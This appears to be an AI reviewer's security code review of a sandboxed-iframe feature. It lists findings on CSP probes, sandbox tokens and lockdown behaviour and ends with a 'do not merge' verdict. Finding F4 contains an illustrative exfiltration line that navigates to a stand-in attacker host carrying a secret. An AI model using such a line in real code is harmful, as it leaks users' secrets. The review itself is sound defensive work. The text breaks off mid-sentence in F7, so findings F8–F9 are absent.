## 4. Findings

### F1 — Three acceptance criteria rest entirely on a harness that cannot run here

**Severity:** advisory (blocking in effect)
**Location:** `scripts/run-browser-harness.js:127-147`; `docs/05-development/ROADMAP.md:79-81`
**Observed:** `npm run test:browser` exits 1 with `Playwright browser binaries are missing
(chromium, firefox)`, and `npx playwright install chromium firefox` fails with
`403 … 'Connection blocked by network allowlist'` from `cdn.playwright.dev`. No system browser
exists. The criteria "iframe instantiates", "`fetch`, `XHR`, and `WebSocket` inside it throw", and
"warm shell cannot read its DOM or variables" therefore have **zero** independent evidence in this
review.
**Expected:** The roadmap itself calls these "the most important tests in the repo". A reviewer must
be able to reproduce them.
**Required action:** Provide a reviewable path that does not need an outbound download — a pinned
offline browser install documented in `build.md`, or CI logs attached to the packet that a reviewer
can re-run — or accept that P0.6 cannot be marked `[x]` until a reviewer with browsers closes these.
This is not a defect in the author's code, but an unverified criterion is a FAIL under the protocol.

### F2 — Acceptance criterion "throw" reinterpreted as "reported blocked"

**Severity:** advisory (blocking — protocol §Automatic FAIL, "Acceptance criteria reinterpreted rather than met")
**Location:** `docs/05-development/packets/p0.6-cold-realm-bootstrap.md:70-79` and `:92`;
`scripts/run-browser-harness.js:143-146`; `test/browser/harness.js:174-177, 204-206`
**Observed:** The roadmap requires the three primitives to **throw**. The author's own pasted output
is `Chromium: cold realm XMLHttpRequest reported blocked (error-event)` and
`Chromium: cold realm WebSocket reported blocked (error-event)` — they did not throw. The harness
accepts `error-event`, `abort-event`, `close-event` and `timeout-event` as passes. Packet §4
restates the criterion as "`fetch`, XHR, and WebSocket inside the iframe are **blocked**", which is
not the roadmap's wording; the roadmap's **Accept:** line was left unchanged while the 🌐 annotation
directly beneath it *was* edited in the same commit.
**Expected:** Per `AGENTS.md` §7, "Never … reinterpret an acceptance criterion to fit what you
built." If the criterion is technically unachievable as written — and it probably is, since CSP does
not make `XMLHttpRequest.send()` throw in Chromium — `AGENTS.md` §4 requires stopping and amending
the roadmap with an ADR, not redefining the word inside a packet.
**Required action:** Amend the ROADMAP **Accept:** line to the behaviour browsers actually provide,
record why in an ADR, and align the packet's wording. Do not widen the criterion in a packet alone.

### F3 — "Blocked" evidence cannot distinguish CSP from DNS failure

**Severity:** advisory
**Location:** `test/browser/harness.js:118`; consumed at `scripts/run-browser-harness.js:143-147`
**Observed:** Every network probe targets `https://coldbox.invalid/network-primitive-test`.
`.invalid` is reserved by RFC 2606 and is guaranteed never to resolve, so `fetch` rejects and XHR
and WebSocket fire `error` events **with or without `connect-src 'none'`**. Each of the three
per-primitive assertions is thus satisfiable by name-resolution failure alone. The only CSP-specific
assertion is a single aggregate call at `run-browser-harness.js:147`,
`expectCspViolationInFrame(coldFrame, 'connect-src')`, which passes if *any one* of the three
produced a `connect-src` violation — so a primitive the policy failed to cover would still be
reported "blocked" and the suite would still go green.
**Expected:** For the project's central security claim, each primitive must be shown to be stopped
**by the policy**, not by the network.
**Required action:** Assert a *new* `connect-src` violation per primitive — snapshot the violation
count before and require an increment after, as `sendBeacon` already does at
`harness.js:240-248` — and add a control demonstrating the same probe behaves differently under a
policy that permits the host.

### F4 — Nothing runnable pins the sandbox token set; extra tokens pass build and tests

**Severity:** advisory
**Location:** `test/build.test.js:149-161`; `src/main.js:201`
**Observed:** The only non-browser assertions are substring tests over the whole 45 KB artifact —
`assert.match(html, /allow-scripts allow-downloads/)` and
`assert.doesNotMatch(html, /allow-same-origin/)` — not assertions about the iframe's attribute
value. I changed `src/main.js:201` to
`'allow-scripts allow-downloads allow-popups allow-top-navigation allow-modals'` on a throwaway
copy:

```
$ node scripts/build.js
Built build/coldbox.html (24628813f0c7255fbb31bec14bbc40929ff6f92d2b43db6c4a098e3bb14b1123)   EXIT=0
$ node --test
# tests 18   # pass 18   # fail 0                                                              EXIT=0
$ grep -n "allow-" build/coldbox.html
1216:      coldFrame.setAttribute('sandbox', 'allow-scripts allow-downloads allow-popups allow-top-navigation allow-modals');
```

`allow-top-navigation` hands the cold realm a top-level navigation channel —
`top.location = 'https://attacker/?' + secret` — which `connect-src 'none'` does **not** cover
(`form-action 'none'` covers form submission, not scripted navigation). `allow-popups` is a second
such channel. The build gates lint and vendor but not this, and there is no CI in the repo yet
(`.github/workflows/` does not exist), so `npm test` is the only gate — and it passes. The one
exact-token assertion, `run-browser-harness.js:128`
(`assert.equal(sandbox, 'allow-scripts allow-downloads', …)`), is browser-gated and currently
unrunnable (F1).
**Expected:** The exact sandbox token set is the single most security-critical constant this item
introduces. It must be pinned by a check that runs under `npm test`, and per the fail-closed
principle should ideally be refused by the build itself.
**Required action:** In `test/build.test.js`, extract the `setAttribute('sandbox', '…')` argument
from the artifact and assert **strict equality** with `allow-scripts allow-downloads`; add a
negative fixture covering an added token.

### F5 — Readiness-timeout lockdown leaves the cold iframe attached and running

**Severity:** advisory
**Location:** `src/main.js:126-150` (`setColdRealmFailure` never touches `coldFrame`);
`src/main.js:207-216`; `scripts/run-browser-harness.js:200-216`
**Observed:** Under jsdom, with the child never signalling ready, at t = 2000 ms the app is
`data-cold-state="failed"`, the status label reads `Locked down` and `#cold-realm-failure` is
visible — while `#cold-frame present = true`, still attached to `#cold-realm-host` with its full
`srcdoc`. `setColdRealmFailure()` clears the timer, flips attributes and text and removes the
listener, but never removes or blanks the frame. The `catch` at `src/main.js:214` has the same
shape: `appendChild` happens at line 207 *before* `coldFrame.srcdoc = …` at line 213, so a throw
from the `srcdoc` assignment also leaves the frame attached. Only the `createElement`-throws and
`srcdoc`-unsupported paths leave no frame — because the element was never created at all. The
harness tests **only** the `createElement` path (`run-browser-harness.js:200-216`), yet packet §4
generalises that single case to "The harness deliberately makes iframe creation throw and verifies
**no frame remains**" as the evidence for the whole fail-closed criterion.
**Why it fails:** The UI asserts "Coldbox is locked down because the sealed realm could not be
established … no secret operation is available in this state" (`src/index.html:98`) while a
half-booted child realm is still attached and executing. `architecture.md`'s Failure-modes table
prescribes **hard fail** for a cold realm that will not instantiate, and a retained frame is not
that. The realistic failure — a browser where the child's hash-pinned script does not run, which is
exactly the risk the packet's own second Assumption flags — takes this untested branch.
**Required action:** Remove the frame (`coldFrame.remove()`, null the reference) inside
`setColdRealmFailure()`, and add a harness case that suppresses the child's ready signal and asserts
`#cold-frame` count is 0 after the timeout, in both engines.

### F6 — The "or variables" half of criterion 3 is never probed

**Severity:** advisory
**Location:** `test/browser/harness.js:266-286`, used at `scripts/run-browser-harness.js:141`
**Observed:** `expectParentCannotReadFrame()` evaluates only `void iframe.contentWindow.document`.
The criterion reads "warm shell cannot read its DOM **or variables**", and `architecture.md:47` /
`SPEC.md:78` extend that to "DOM, variables, or keystrokes". No assertion touches
`contentWindow.<anything else>` or `contentDocument`.
**Required action:** Extend the P0.6 harness step to assert that reading a named global set by the
child, and reading `iframe.contentDocument`, also throw — so the criterion is covered as written.

### F7 — Canonical CSP documentation no longer matches the built artifact

**Severity:** advisory
**Location:** `docs/02-security/csp-policy.md:58-83` (warm-shell policy block) and `:107-111`;
`docs/05-development/build.md:45`; vs `build/coldbox.html:7`
**Observed:** This PR changes the **warm shell's** policy: `script-src` and `style-src` each now
carry a second hash, and those are the cold realm's inline blocks
(`'sha256-58VtS03dzCnBdShF9v7L5TQtT/Wy+eCQ18N3BgrPPkU='`,
`'sha256-vIDCBRfW8oXp/6qefgn1GC0KvmVTEytQUs4fkhX2T1c='`). `csp-policy.md`'s warm-shell listing was
not touched and still shows a single `'sha256-<inline-script-hash>'` / `'sha256-<inline-style-hash>'`
pair, with no mention that the parent must enumerate the child's blocks. The "`srcdoc` iframes
inherit parent CSP" gotcha at `:107-111` still reads as though inheritance costs the parent nothing.
`build.md:45` likewise describes hash injection without this step. The only place the fact is
written down is the PR packet (§5, §8) — a historical evidence document, not a canonical home.
**Why it fails:** `doc-hygiene.md` Rule 1 names `csp-policy.md` **+ the built artifact** as the

## 5. Verdict rationale

Much of this work is careful, and several things I tried hard to break held up: the build is
reproducible across four runs, two locales, two timezones and a non-ASCII path; the embedded
`srcdoc` escaping is genuinely safe (no `<` survives into the outer inline script); `allow-same-origin`
is absent from the artifact; the cold document really does carry `connect-src 'none'`; the warm
`connect-src` allowlist is untouched; the lockdown latch is terminal against a late signal; a forged
same-window `cold.ready` is correctly ignored; and four separate deliberate breakages under
`src/cold/` all make the build exit non-zero with clear messages. None of that is in dispute.

It fails on evidence and on two concrete gaps. Three of the item's four acceptance criteria are
verifiable **only** through `npm run test:browser`, which cannot run here (F1) — and the protocol is
explicit that an unverifiable criterion is a FAIL. The one criterion whose evidence I can read, the
packet's own harness output, shows the "throw" requirement reinterpreted as "reported blocked" (F2),
and the probe design cannot separate CSP enforcement from a non-resolving hostname (F3), so the
project's self-declared most important test does not yet prove what it claims. Independently of the
browser question, the exact sandbox token set is unpinned by anything runnable, and I demonstrated
that adding `allow-top-navigation` passes both the build and all 18 tests (F4). The fail-closed path
is right for the two creation-failure branches and wrong for the readiness-timeout branch, which
leaves a live child realm attached beneath a UI that says otherwise, and which no test covers (F5).
Three documentation defects (F6/F7/F8) and a process/path collision (F9) complete the list.

**To turn this into a PASS:** fix F2–F8 — strict sandbox-token assertion in `npm test`;
per-primitive `connect-src` violation assertions; remove the frame on lockdown plus a timeout-path
harness case; probe a child variable as well as its DOM; ROADMAP amendment and ADR for the "throw"
wording; update `csp-policy.md` and `build.md`; correct the batch note — resolve F9's path
collision, and then have the branch re-reviewed **in an environment with working Playwright binaries
and npm-registry access**, so F1 and the upstream vendor comparison can be closed with real output.
Re-review is a fresh verdict on the new commit, not an amendment to this one.

**Do not merge.** Note also that even on a future PASS, `review-protocol.md` forbids the reviewer
merging this item: P0.6 is one of the three realm-boundary / message-schema / vault-format items
reserved for a human merge.
